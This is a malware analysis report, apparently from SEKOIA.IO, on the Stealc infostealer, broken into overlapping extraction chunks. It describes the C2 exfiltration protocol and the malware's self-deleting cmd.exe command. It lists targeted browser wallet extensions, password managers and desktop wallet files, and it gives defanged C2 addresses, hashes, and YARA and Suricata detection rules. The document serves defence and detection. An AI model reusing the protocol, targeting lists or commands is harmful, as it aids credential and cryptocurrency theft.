"Figure 6. Stealc C2 communication, second POST request to get the data collection configuration for web browsers 1. Using the same format, it sends the command plugins to the C2 to retrieve its configuration for data collection from web browser extensions, using a POST request on the server gate (name=”token”, name=”message” (plugins)). The server responds with the base64-encoded configuration, such as: MetaMask|djclckkglechooblngghdinmeemkbgci|1|0|0|MetaMask|ejbalbakoplchlghecdalmeeeajnimhm|1|0|0| MetaMask|nkbihfbeogaeaoehlefnkodbefgpgknn|1|0|0|TronLink|ibnejdfjmmkpcnlpebklmnkoeoihofec|1|0|0| Binance Wallet|fhbohimaelbohpjbbldcngcnapndodjp|1|0|0|Yoroi|ffnbelfdoeiohenkjibnmadjiehjhajb|1|0|0| Coinbase Wallet extension|hnfanknocfeofbddgcijnmhnfnkdnaad|1|0|1|Guarda| hpglfhgfnhbgpjdenjgmdgoeiappafln|1|0|0|(redacted)

6/17"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|b601c502e12543708335bf5e797040d5
"6/17

1. Stealc exfiltrates fingerprint data of the infected host, using a POST request on the server gate (name=”token”, name=”file_name”, name=”file”). The file is named system_info.txt and includes information on network, system summary, user agents, installed apps and process list. 2. It downloads 7 legitimate third-party DLLs from the C2 server, using GET requests, in the following order: sqlite3.dll freebl3.dll mozglue.dll msvcp40.dll nss3.dll softokn3.dll vcruntime140.dll 3. Stealc exfiltrates files one by one, using POST requests on the server gate (name=”token”, name=”file_name”, name=”file”). Files collected and exfiltrated by the malware correspond to those defined in the received configuration, such as (for a victim host having Mozilla Firefox installed): history\Mozilla Firefox_*.default-release.txt autofill\Mozilla Firefox_*.default-release.txt cookies\Mozilla Firefox_*.default-release.txt 4. It sends the command wallets to the C2 to retrieve its configuration for data collection from desktop cryptocurrency wallets, using a POST request on the server gate (name=”token”, name=”message” (wallets)). Again, the server responds with the base64-encoded configuration, such as: Bitcoin Core|\Bitcoin\wallets\|wallet.dat|1|Bitcoin Core Old|\Bitcoin\|*wallet*.dat|0|Dogecoin|\Dogecoin\|*wallet*.dat|0|Raven Core|\Raven\|*wallet*.dat|0|Daedalus Mainnet|\Daedalus Mainnet\wallets\|she*.sqlite|0|Blockstream Green|\Blockstream\Green\wallets\|*."|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|beb6f65ed9bb43cb8e18ccf0e9fc4146
"|1|Wasabi Wallet|\WalletWasabi\Client\Wallets\|*.json|0|Ethereum|\Ethereum\|keystore|0|Electrum|\Electrum\wallets\|*. *|0| (redacted)

1. It also sends the command files to the C2 to retrieve its configuration for the file grabber, using a POST request on the server gate (name=”token”, name=”message” (files)). The server responds with the base64-encoded configuration, such as: DESKTOP|%DESKTOP%\|*.txt|15|1|0|Doki|%DOCUMENTS%\|*.txt|15|1|0|"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|9444496316c54fa5a9852e0621961df2
"1. Again, it exfiltrates the collected data using the same pattern as previously described in step 6 (name=”token”, name=”file_name”, name=”file”). With the previous configuration, the file files\DESKTOP\SwitchSearch.txt is collected and exfiltrated by the malware. 2. Finally, Stealc obfuscated data includes the file path or the Windows Registry key related to sensitive data of Discord, Telegram, Tox, Outlook and Steam. The malware gathers the targeted files and exfiltrates then with the same pattern as described before. 3. Once the malware finishes retrieving all configurations and exfiltrating collected data, it sends the command done using a POST request on the server gate (name=”token”, name=”message” (done)). Stealc C2 communications are verbose when the infected host has multiple web browsers, extensions, desktop wallets or files matching the collection configuration. Once the data collection process is done, the malware removes itself and the downloaded DLL files from the compromised host by executing the following command: cmd.exe /c timeout /t 5 & del /f /q ""$STEALERPATH"" & del ""C:\ProgramData\*.dll"" & exit"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|38782969d46e43af9aa9a51082a102b9
"Tracking Stealc in its many forms Standalone samples An efficient way to detect the Stealc standalone samples consists in writing a YARA rule on the specific strings which are not obfuscated (those which were added in the v1.2.0 Stealc release). For this purpose, we compare the common strings embedded in all the Stealc standalone samples. Here are the characteristic strings included in all standalone samples:

7/17

ASCII: ----



paddr: 69704, 69726

ASCII: \..\

paddr: 69844

ASCII: block

paddr: 69856

ASCII: Network Info:

paddr: 69864

ASCII:



IP: IP?

paddr: 69881

ASCII:



Country: ISO?

paddr: 69893

ASCII:



Display Resolution:

paddr: 69913

ASCII: User Agents:

paddr: 69936

We can also sign the malware function that loops over the obfuscated strings to deobfuscate them. A YARA rule based on both methods is shared in IoCs & Technical Details.

Packed samples YARA signatures based on the malware strings or functions are not efficient when the sample is packed using a commercial packer, a custom loader, embedded in a shellcode, or else. In that scenario, dynamic detection is a valid option. To this end, we can use a YARA rule for VirusTotal Livehunt to detect the specific commands executed by Stealc or the specific C2 communications, including: /c timeout /t 5 del /f /q ""%SAMPLEPATH%"" del ""%ProgramData%\*.dll"""" /sqlite3.dll .php"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|d60a110e8ed2492f822abf2f03010baa
"As we did above to pivot on this malware family, we can correlate these specific behaviours in a YARA rule using VirusTotal Livehunt. A YARA rule is shared in IoCs & Technical Details.

C2 servers Tracking the Stealc C2 servers can be done using the HTTP and HTML default responses which seem to be characteristic. Most of the scanned C2 servers responds an HTTP 200 status code with an HTML page containing a “404 Forbidden” Apache server on the port 80, as shown below:

HTTP/1.1 200 OK Date: <REDACTED> Server: Apache/2.4.41 (Ubuntu) Vary: Accept-Encoding Content-Length: 145 Content-Type: text/html; charset=UTF-8 <html> <head><title>404 Forbidden</title></head> <body> <center><h1>404 Forbidden</h1></center> <hr> <center>apache</center> </body> </html>

To confirm that a server matching this specific HTML response and an HTTP 200 status code corresponds to a Stealc C2 server, we can scan some URIs opened on Stealc servers, such as “/modules/” and “/index.php/”. At the time of writing, SEKOIA.IO found 35 active servers associated with Stealc C2 with high confidence (listed below in IoCs & Technical Details), and more than 40 Stealc samples."|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|a1c60c9d5fd44785be9708c64b49206f
"Conclusion Stealc is another fully featured infostealer sold as a MaaS which emerged on underground forums in early 2023. Plymouth drew on the today’s trendy infostealers on the market (Vidar, Raccoon, Redline and Mars) to develop a malware that quickly became popular among Russian-speaking cybercriminals. Since customers of the Stealc MaaS own a build of its administration panel to host the stealer C2 server and generate stealer samples themselves, it is likely that the build will leak into the underground communities in the medium term. For that matter SEKOIA.IO further assess the Plymouth business possibly will not be viable over several years, as Vidar or Raccoon projects are. However, it is likely that a cracked version of the Stealc build may be released in the future which may be used for many years to come. However, we expect that the Stealc infostealer will become widespread in the near term, as multiple threat actors add the malware to their arsenal while it is poorly monitored. Companies facing stealer compromise need to be aware of this malware. 8/17

To provide our customers with actionable intelligence, SEKOIA.IO analysts will continue to monitor emerging and prevalent infostealers, including Stealc.

Annex Annex 1 – Stealc capabilities Targeted web browsers Web browser

Path of targeted file

Format

Google Chrome

\Google\Chrome\User Data

chrome

Google Chrome Canary

\Google\Chrome SxS\User Data

chrome

Chromium

\Chromium\User Data

chrome

Amigo"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|dfc820fa2873441da0975574937dfc2d
"\Google\Chrome\User Data

chrome

Google Chrome Canary

\Google\Chrome SxS\User Data

chrome

Chromium

\Chromium\User Data

chrome

Amigo

\Amigo\User Data

chrome

Torch

\Torch\User Data

chrome

Vivaldi

\Vivaldi\User Data

chrome

Comodo Dragon

\Comodo\Dragon\User Data

chrome

EpicPrivacyBrowser

\Epic Privacy Browser\User Data

chrome

CocCoc

\CocCoc\Browser\User Data

chrome

Brave

\BraveSoftware\Brave



Browser\User Data

chrome

Cent Browser

\CentBrowser\User Data

chrome

7Star

\7Star\7Star\User Data

chrome

Chedot Browser

\Chedot\User Data

chrome

Microsoft Edge

\Microsoft\Edge\User Data

chrome

360 Browser

\360Browser\Browser\User Data

chrome

QQBrowser

\Tencent\QQBrowser\User Data

chrome

CryptoTab

\CryptoTab Browser\User Data

chrome

Opera Stable

\Opera Software

opera

Opera GX Stable

\Opera Software

opera

Mozilla Firefox

\Mozilla\Firefox\Profiles

firefox

Pale Moon

\Moonchild Productions\Pale Moon\Profiles

firefox

Opera Crypto Stable

\Opera Software

opera

Targeted browser extensions

Cryptocurrency wallet

Extension ID

MetaMask

djclckkglechooblngghdinmeemkbgci

MetaMask

ejbalbakoplchlghecdalmeeeajnimhm

MetaMask

nkbihfbeogaeaoehlefnkodbefgpgknn

TronLink

ibnejdfjmmkpcnlpebklmnkoeoihofec

Binance Wallet

fhbohimaelbohpjbbldcngcnapndodjp

9/17

Yoroi

ffnbelfdoeiohenkjibnmadjiehjhajb

Coinbase Wallet extension

hnfanknocfeofbddgcijnmhnfnkdnaad

Guarda

hpglfhgfnhbgpjdenjgmdgoeiappafln

Jaxx Liberty"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|e900f53dac204cb5821519b282a0c474
"Coinbase Wallet extension

hnfanknocfeofbddgcijnmhnfnkdnaad

Guarda

hpglfhgfnhbgpjdenjgmdgoeiappafln

Jaxx Liberty

cjelfplplebdjjenllpjcblmjkfcffne

iWallet

kncchdigobghenbbaddojjnnaogfppfj

MEW CX

nlbmnnijcnlegkjjpcfjclmcfggfefdm

GuildWallet

nanjmdknhkinifnkgdcggcfnhdaammmj

Ronin Wallet

fnjhmkhhmkbjkkabndcnnogagogbneec

NeoLine

cphhlgmgameodnhkjdmkpanlelnlohao

CLV Wallet

nhnkbkgjikgcigadomkphalanndcapjk

Liquality Wallet

kpfopkelmapcoipemfendmdcghnegimn

Terra Station Wallet

aiifbnbfobpmeekipheeijimdpnlpgpp

Keplr

dmkamcknogkgcdfhhbddcghachkejeap

Sollet

fhmfendgdocmcbmfikdcogofphimnkno

Auro Wallet(Mina Protocol)

cnmamaachppnkjgnildpdmkaakejnhae

Polymesh Wallet

jojhfeoedkpkglbfimdfabpdfjaoolaf

ICONex

flpiciilemghbmfalicajoolhkkenfel

Coin98 Wallet

aeachknmefphepccionboohckonoeemg

EVER Wallet

cgeeodpfagjceefieflmdfphplkenlfk

KardiaChain Wallet

pdadjkfkgcafgbceimcpbkalnfnepbnk

Rabby

acmacodkjbdgmoleebolmdjonilkdbch

Phantom

bfnaelmomeimhlpmgjnjophhpkkoljpa

Brave Wallet

odbfpeeihdkbihmopkbjmoonfanlbfcl

Oxygen

fhilaheimglignddkjgofkcbgekhenbh

Pali Wallet

mgffkfbidihjpoaomajlbgchddlicgpn

BOLT X

aodkkagnadcbobfpggfnjeongemjbjca

XDEFI Wallet

hmeobnfnfcmdkdcmlblgagmfpfboieaf

Nami

lpfcbjknijpeeillifnkikgncikgfhdo

Maiar DeFi Wallet

dngmlblcodfobpdpecaadgfbcggfjfnm

Keeper Wallet

lpilbniiabackdjcionkobglmddfbcjo

Solflare Wallet

bhhhlbepdkbapadjdnnojkbgioiodbic

Cyano Wallet

dkdedlpgdmmkkfjabffeganieamfklkm

KHC"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|8514a1d044c5404ebe99f72936a2e264
"lpilbniiabackdjcionkobglmddfbcjo

Solflare Wallet

bhhhlbepdkbapadjdnnojkbgioiodbic

Cyano Wallet

dkdedlpgdmmkkfjabffeganieamfklkm

KHC

hcflpincpppdclinealmandijcmnkbgn

TezBox

mnfifefkajgofkcjkemidiaecocnkjeh

Temple

ookjlbkiijinhpmnjffcofjonbfbgaoc

Goby

jnkelfanjkeadonecabehalmbgpfodjm

Ronin Wallet

kjmoohlgokccodicjjfebfomlbljgfhk

10/17

Byone

nlgbhdfgdhgbiamfdfmbikcdghidoadd

OneKey

jnmbobjmhlngoefaiojfljckilhhlhcj

DAppPlay

lodccjjbdhfakaekdiahmedfbieldgik

SteemKeychain

jhgnbkkipaallpehbohjmkbjofjdmeid

Braavos Wallet

jnlgamecbpmbajjfhmmmlhejkemejdma

Enkrypt

kkpllkodjeloidieedojogacfhpaihoh

OKX Wallet

mcohilncbfahbmgdjkbpemcciiolgcge

Sender Wallet

epapihdplajcdnnkdeiahlgigofloibg

Hashpack

gjagmgiddbbciopjhllkdnddhcglnemk

Eternl

kmhcihpebfmpgmihbkipmjlmmioameka

Pontem Aptos Wallet

phkbamefinggmakgklpkljjmgibohnba

Petra Aptos Wallet

ejjladinnckdgjemekebdpeokbikhfci

Martian Aptos Wallet

efbglgofoippbgcjepnhiblaibcnclgk

Finnie

cjmkndjhnagcfbpiemnkdpomccnjblmj

Leap Terra Wallet

aijcbedoijmgnlmjeegjaglmepbmpkpi

Trezor Password Manager

imloifkgjagghnncjkhggdhalmcnfklk

Authenticator

bhghoamapcdpbohphigoooaddinpkbai

Authy

gaedmjdfmmahhbjefcbgaolhhanlaolb

EOS Authenticator

oeljdldpnmdbchonielidgobddffflal

GAuth Authenticator

ilgcnhelpchnceeipipijaljkblbcobl

Bitwarden

nngceckbapebfimnlniiiahkandclblb

KeePassXC

oboonakemofpalcgghocfoadofidjkkk

Dashlane

fdjamakpfbbddfjaooikfcpapjohcfmg

NordPass

fooolghllnmhmmndgjiamiiodkpenpbb"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|b972c6124e5747928a5c4cb4c13d688e
"KeePassXC

oboonakemofpalcgghocfoadofidjkkk

Dashlane

fdjamakpfbbddfjaooikfcpapjohcfmg

NordPass

fooolghllnmhmmndgjiamiiodkpenpbb

Keeper

bfogiafebfohielmmehodmfbbebbbpei

RoboForm

pnlccmojcmeohlpggmfnbbiapkmbliob

LastPass

hdokiejnpimakedhajhdlcegeplioahd

BrowserPass

naepdomgkenhinolocfifgehidddafch

MYKI

bmikpgodpkclnkgmnpphehdgcimmided

Splikity

jhfjfclepacoldmjmkmdlmganfaalklb

CommonKey

chgfefjpcobfbnpmiokfjjaglahmnded

Zoho Vault

igkpcodhieompeloncfnbekccinhapdb

Opera Wallet

gojhcdgcpbpfigcaejpfhfegekdgiblk

Targeted desktop cryptocurrency wallets

Cryptocurrency wallet

Path of targeted directory

File

Bitcoin Core

\Bitcoin\wallets\

wallet.dat

11/17

Bitcoin Core Old

\Bitcoin\

wallet.dat

Dogecoin

\Dogecoin\

wallet.dat

Raven Core

\Raven\

wallet.dat

Daedalus Mainnet

\Daedalus Mainnet\wallets\

she



.sqlite

Blockstream Green

\Blockstream\Green\wallets\

.

Wasabi Wallet

\WalletWasabi\Client\Wallets\

.json

Ethereum

\Ethereum\

keystore

Electrum

\Electrum\wallets\

.

ElectrumLTC

\Electrum



LTC\wallets\

.

Exodus

\Exodus\

exodus.conf.json

Exodus

\Exodus\

window



state.json

Exodus

\Exodus\exodus.wallet\

passphrase.json

Exodus

\Exodus\exodus.wallet\

seed.seco

Exodus

\Exodus\exodus.wallet\

info.seco

Electron Cash

\ElectronCash\wallets\

.

MultiDoge

\MultiDoge\

multidoge.wallet

Jaxx Desktop (old)

\jaxx\Local Storage\

file__0.localstorage

Jaxx Desktop

\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb\

."|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|784b724ab3a94ad19c8299b85dc24db6
"Jaxx Desktop (old)

\jaxx\Local Storage\

file__0.localstorage

Jaxx Desktop

\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb\

.

Atomic

\atomic\Local Storage\leveldb\

.

Binance

\Binance\

app



store.json

Binance

\Binance\

simple



storage.json

Binance

\Binance\

.finger



print.fp

Coinomi

\Coinomi\Coinomi\wallets\

.wallet

Coinomi

\Coinomi\Coinomi\wallets\

.config

Annex 2 – A Stealc’s infection chain SEKOIA.IO observed an infection chain distributing Stealc, that consists in the following steps:

12/17

Figure 7. Cracked software catalogue website (rcc-software[. ]com) luring the user to download Stealc sample 1. YouTube videos on stolen accounts describing how to install a cracked software for free and providing a link (hxxps://rccsoftware[. ]com/services); 2. From the link provided in the YouTube video, the victim can access a “cracked software catalogue” website; 3. The payload embeds Stealc infostealer. The user downloads it, decompresses the archive using the password 55555 and executes the file “setup.exe” (hxxps://streetlifegaming[. ]com/wp-content/uploads/2023/02/Pass_55555_Setup.rar); 4. Stealc communicates to its C2 on 37.220.87[. ]65 (https://tria.ge/230212-pkc69adh37).

IoCs & Technical Details IoCs The list of IoCs is available on SEKOIA github repository.

Stealc C2 servers

13/17

185.143.223[. ]136

94.131.99[. ]185

65.109.131[. ]183

45.87.153[. ]50

179.43.162[. ]94

194.87.31[. ]146

94.142.138[. ]11

23.88.116[. ]117"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|56ac7db2ace84ec6996d160a5dee63ce
"185.143.223[. ]136

94.131.99[. ]185

65.109.131[. ]183

45.87.153[. ]50

179.43.162[. ]94

194.87.31[. ]146

94.142.138[. ]11

23.88.116[. ]117

95.217.143[. ]99

185.242.87[. ]149

194.4.51[. ]160

5.75.138[. ]201

185.130.46[. ]214

167.235.62[. ]105

185.247.184[. ]7

179.43.162[. ]89

91.228.225[. ]46

179.43.162[. ]2

77.246.156[. ]93

84.246.85[. ]80

185.5.248[. ]95

146.70.161[. ]51

85.239.54[. ]29

91.215.85[. ]188

77.91.124[. ]7

37.120.238[. ]190

37.220.87[. ]65

45.136.49[. ]247

45.136.50[. ]69

45.136.51[. ]61

45.144.29[. ]176

65.109.3[. ]34

94.142.138[. ]48

95.216.112[. ]83

195.74.86[. ]37

162.0.238[. ]10

666palm[. ]com

777palm[. ]com

aa



cj[. ]com

fff



ttt[. ]com

moneylandry[. ]com

Stealc C2 URLs

hxxp://146.70.161[.]51/273d9c8034a95cb4.phphxxp://162.0.238[. ]10/752e382b4dcf5e3f.php

hxxp://176.124.192[. ]200/bef7fb05c9ef6540.php

hxxp://179.43.162[. ]2/d8ab11e9f7bc9c13.php

hxxp://185.5.248[. ]95/api.php

hxxp://666palm[. ]com/bca98681abf8e1ab.php

hxxp://777palm[. ]com/bef7fb05c9ef6540.php

hxxp://94.142.138[. ]48/f9f76ae4bb7811d9.php

hxxp://95.216.112[. ]83/413a030d85acf448.php

hxxp://aa



cj[. ]com/6842f013779f3d08.php

hxxp://fff



ttt[. ]com/984dd96064cb23d7.php

hxxp://moneylandry[. ]com/bef7fb05c9ef6540.php

hxxp://94.142.138[. ]48/f9f76ae4bb7811d9.php

hxxp://185.247.184[. ]7/8c3498a763cc5e26.php

hxxps://185.247.184[. ]7/8c3498a763cc5e26.php

hxxp://23.88.116[. ]117/api.php

hxxp://95.216.112[. ]83/413a030d85acf448.php"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|dbcb932cfaa84aa0b6beee2dc7f9d0f4
"hxxps://185.247.184[. ]7/8c3498a763cc5e26.php

hxxp://23.88.116[. ]117/api.php

hxxp://95.216.112[. ]83/413a030d85acf448.php

hxxp://179.43.162[. ]2/d8ab11e9f7bc9c13.php

hxxp://185.5.248[. ]95/c1377b94d43eacea.php

hxxp://146.70.161[. ]51/58d66e64beb49702/freebl3.dll

hxxp://146.70.161[. ]51/58d66e64beb49702/mozglue.dll

hxxp://146.70.161[. ]51/58d66e64beb49702/msvcp140.dll

hxxp://146.70.161[. ]51/58d66e64beb49702/nss3.dll

hxxp://146.70.161[. ]51/58d66e64beb49702/softokn3.dll

hxxp://146.70.161[. ]51/58d66e64beb49702/sqlite3.dll

hxxp://146.70.161[. ]51/58d66e64beb49702/vcruntime140.dll

hxxp://162.0.238[. ]10/dbe4ef521ee4cc21/freebl3.dll

hxxp://162.0.238[. ]10/dbe4ef521ee4cc21/mozglue.dll

hxxp://162.0.238[. ]10/dbe4ef521ee4cc21/msvcp140.dll

hxxp://162.0.238[. ]10/dbe4ef521ee4cc21/nss3.dll

hxxp://162.0.238[. ]10/dbe4ef521ee4cc21/softokn3.dll

hxxp://162.0.238[. ]10/dbe4ef521ee4cc21/sqlite3.dll

hxxp://162.0.238[. ]10/dbe4ef521ee4cc21/vcruntime140.dll

hxxp://179.43.162[. ]2/3461133978273cb9/freebl3.dll

hxxp://179.43.162[. ]2/3461133978273cb9/mozglue.dll

hxxp://179.43.162[. ]2/3461133978273cb9/msvcp140.dll

hxxp://179.43.162[. ]2/3461133978273cb9/nss3.dll

hxxp://179.43.162[. ]2/3461133978273cb9/softokn3.dll

hxxp://179.43.162[. ]2/3461133978273cb9/sqlite3.dll

hxxp://179.43.162[. ]2/3461133978273cb9/vcruntime140.dll

hxxp://185.5.248[. ]95/libs/freebl3.dll

hxxp://185.5.248[. ]95/libs/mozglue.dll

hxxp://185.5.248[. ]95/libs/msvcp140.dll"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|cfcbd755b75b48548c7bf3435309f3ec
"hxxp://185.5.248[. ]95/libs/freebl3.dll

hxxp://185.5.248[. ]95/libs/mozglue.dll

hxxp://185.5.248[. ]95/libs/msvcp140.dll

hxxp://185.5.248[. ]95/libs/nss3.dll

hxxp://185.5.248[. ]95/libs/softokn3.dll

hxxp://185.5.248[. ]95/libs/sqlite3.dll

hxxp://185.5.248[. ]95/libs/vcruntime140.dll

hxxp://666palm[. ]com/54fbf4b9ffe8c98d/freebl3.dll

hxxp://666palm[. ]com/54fbf4b9ffe8c98d/mozglue.dll

hxxp://666palm[. ]com/54fbf4b9ffe8c98d/msvcp140.dll

hxxp://666palm[. ]com/54fbf4b9ffe8c98d/nss3.dll

hxxp://666palm[. ]com/54fbf4b9ffe8c98d/softokn3.dll

hxxp://666palm[. ]com/54fbf4b9ffe8c98d/sqlite3.dll

hxxp://666palm[. ]com/54fbf4b9ffe8c98d/vcruntime140.dll

14/17

hxxp://777palm[. ]com/2ccaf544c0cf7de7/freebl3.dll

hxxp://777palm[. ]com/2ccaf544c0cf7de7/mozglue.dll

hxxp://777palm[. ]com/2ccaf544c0cf7de7/msvcp140.dll

hxxp://777palm[. ]com/2ccaf544c0cf7de7/nss3.dll

hxxp://777palm[. ]com/2ccaf544c0cf7de7/softokn3.dll

hxxp://777palm[. ]com/2ccaf544c0cf7de7/sqlite3.dll

hxxp://777palm[. ]com/2ccaf544c0cf7de7/vcruntime140.dll

hxxp://94.142.138[. ]48/54982f23330528c2/freebl3.dll

hxxp://94.142.138[. ]48/54982f23330528c2/mozglue.dll

hxxp://94.142.138[. ]48/54982f23330528c2/msvcp140.dll

hxxp://94.142.138[. ]48/54982f23330528c2/nss3.dll

hxxp://94.142.138[. ]48/54982f23330528c2/softokn3.dll

hxxp://94.142.138[. ]48/54982f23330528c2/sqlite3.dll

hxxp://94.142.138[. ]48/54982f23330528c2/vcruntime140.dll

hxxp://95.216.112[. ]83/5840871afdb84f06/sqlite3.dll

hxxp://aa"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|76458fb26f314e019585f955699dc250
"hxxp://94.142.138[. ]48/54982f23330528c2/vcruntime140.dll

hxxp://95.216.112[. ]83/5840871afdb84f06/sqlite3.dll

hxxp://aa



cj[. ]com/1b8df000d02ce631/freebl3.dll

hxxp://aa



cj[. ]com/1b8df000d02ce631/mozglue.dll

hxxp://aa



cj[. ]com/1b8df000d02ce631/msvcp140.dll

hxxp://aa



cj[. ]com/1b8df000d02ce631/nss3.dll

hxxp://aa



cj[. ]com/1b8df000d02ce631/softokn3.dll

hxxp://aa



cj[. ]com/1b8df000d02ce631/sqlite3.dll

hxxp://aa



cj[. ]com/1b8df000d02ce631/vcruntime140.dll

hxxp://fff



ttt[. ]com/a02fc2187db8cd88/freebl3.dll

hxxp://fff



ttt[. ]com/a02fc2187db8cd88/mozglue.dll

hxxp://fff



ttt[. ]com/a02fc2187db8cd88/msvcp140.dll

hxxp://fff



ttt[. ]com/a02fc2187db8cd88/nss3.dll

hxxp://fff



ttt[. ]com/a02fc2187db8cd88/softokn3.dll

hxxp://fff



ttt[. ]com/a02fc2187db8cd88/sqlite3.dll

hxxp://fff



ttt[. ]com/a02fc2187db8cd88/vcruntime140.dll

hxxp://moneylandry[. ]com/2ccaf544c0cf7de7/freebl3.dll

hxxp://moneylandry[. ]com/2ccaf544c0cf7de7/mozglue.dll

hxxp://moneylandry[. ]com/2ccaf544c0cf7de7/msvcp140.dll

hxxp://moneylandry[. ]com/2ccaf544c0cf7de7/nss3.dll

hxxp://moneylandry[. ]com/2ccaf544c0cf7de7/softokn3.dll

hxxp://moneylandry[. ]com/2ccaf544c0cf7de7/sqlite3.dll

hxxp://moneylandry[. ]com/2ccaf544c0cf7de7/vcruntime140.dll

hxxp://94.142.138[. ]48/54982f23330528c2/msvcp140.dll

hxxp://5.75.138[. ]201/9026ac2a280e901d/softokn3.dll

hxxp://23.88.116[. ]117/libs/sqlite3.dll

hxxp://185.247.184[. ]7/b00dc1fe53045ca1/sqlite3.dll"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|e909435803664bbb9fbe7ebd4e01b807
"hxxp://5.75.138[. ]201/9026ac2a280e901d/softokn3.dll

hxxp://23.88.116[. ]117/libs/sqlite3.dll

hxxp://185.247.184[. ]7/b00dc1fe53045ca1/sqlite3.dll

hxxp://146.70.161[. ]51/58d66e64beb49702/freebl3.dll

hxxp://95.216.112[. ]83/5840871afdb84f06/mozglue.dll

hxxp://179.43.162[. ]2/3461133978273cb9/sqlite3.dll

hxxp://179.43.162[. ]2/3461133978273cb9/msvcp140.dll

hxxp://185.5.248[. ]95/libs/mozglue.dll

Stealc SHA256 (standalone samples) 1e09d04c793205661d88d6993cb3e0ef5e5a37a8660f504c1d36b0d8562e63a2 77d6f1914af6caf909fa2a246fcec05f500f79dd56e5d0d466d55924695c702d 87f18bd70353e44aa74d3c2fda27a2ae5dd6e7d238c3d875f6240283bc909ba6 More IoCs are available in the SEKOIA.IO Intelligence Center.

YARA rules YARA rules are available on SEKOIA github repository.

Static detection

15/17"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|b6d900cb18274ee0b81b27a24b91d41e
"YARA rules YARA rules are available on SEKOIA github repository.

Static detection

15/17

rule infostealer_win_stealc { meta: malware = ""Stealc"" description = ""Find standalone Stealc sample based on decryption routine or characteristic strings"" source = ""SEKOIA.IO"" reference = ""https://blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularitypart-1/"" classification = ""TLP:CLEAR"" hash = ""77d6f1914af6caf909fa2a246fcec05f500f79dd56e5d0d466d55924695c702d"" strings: $dec = { 55 8b ec 8b 4d ?? 83 ec 0c 56 57 e8 ?? ?? ?? ?? 6a 03 33 d2 8b f8 59 f7 f1 8b c7 85 d2 74 04 } //deobfuscation function $str01 = ""------"" ascii $str02 = ""Network Info:"" ascii $str03 = ""- IP: IP?"" ascii $str04 = ""- Country: ISO?"" ascii $str05 = ""- Display Resolution:"" ascii $str06 = ""User Agents:"" ascii $str07 = ""%s\\%s\\%s"" ascii condition: uint16(0) == 0x5A4D and ($dec or 5 of ($str*)) }"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|69990d3e09554994bd3fa2f731f6ee46
"Dynamic detection using VirusTotal Livehunt import ""vt"" rule infostealer_win_stealc_behaviour { meta: malware = ""Stealc"" description = ""Find Stealc sample based characteristic behaviors"" source = ""SEKOIA.IO"" reference = ""https://blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularitypart-1/"" classification = ""TLP:CLEAR"" hash = ""3feecb6e1f0296b7a9cb99e9cde0469c98bd96faed0beda76998893fbdeb9411"" condition: for any cmd in vt.behaviour.command_executions : ( cmd contains ""\\*.dll"" ) and for any cmd in vt.behaviour.command_executions : ( cmd contains ""/c timeout /t 5 & del /f /q"" ) and for any c in vt.behaviour.http_conversations : ( c.url contains "".php"" ) }"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|04d9cd3f2123477293fb979d8fe6f63c
"Suricata rules Suricata signatures are available on SEKOIA github repository. alert http $HOME_NET any -> $EXTERNAL_NET any (msg:""SEKOIA.IO Malware Stealc POST request: hwid, build""; \ flow:established,to_server; http.method; content:""POST""; http.uri; content:"".php""; depth:21; http.content_type; \ content:""multipart/form-data|3B| boundary=----""; http.request_body; content:""Content-Disposition: form-data|3B| name=|22|hwid|22|""; \ offset: 26 ; depth: 45; content:""Content-Disposition: form-data|3B| name=|22|build|22|""; reference:url, \ blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-1/; \ classtype:trojan-activity; sid:001; rev:1; metadata:created_at 2023_02_17, updated_at 2023_02_17;) alert http $HOME_NET any -> $EXTERNAL_NET any (msg:""SEKOIA.IO Malware Stealc POST request: token, message""; \ flow:established,to_server; http.method; content:""POST""; http.uri; content:"".php""; depth:21; http.content_type; \ content:""multipart/form-data|3B| boundary=----""; http.request_body; content:""Content-Disposition: form-data|3B| \ name=|22|token|22|""; offset: 26 ; depth: 46; content:""Content-Disposition: form-data|3B| name=|22|message|22|""; \ threshold: type limit, track by_src, seconds 180, count 1; reference:url, \ blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-1/; \ classtype:trojan-activity; sid:002; rev:1; metadata:created_at 2023_02_17, updated_at 2023_02_17;)

16/17

MITRE ATT&CK TTPs

Tactic"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|af004a3561ee40baa705e10c56aa7c95
"16/17

MITRE ATT&CK TTPs

Tactic

Technique

Execution

T1059.003 – Command and Scripting Interpreter: Windows Command Shell

Execution

T1106 – Native API

Execution

T1129 – Shared Modules

Defence Evasion

T1027 – Obfuscated Files or Information

Defence Evasion

T1027.007 – Obfuscated Files or Information: Dynamic API Resolution

Defense Evasion

T1036 – Masquerading

Defense Evasion

T1055 – Process Injection

Defense Evasion

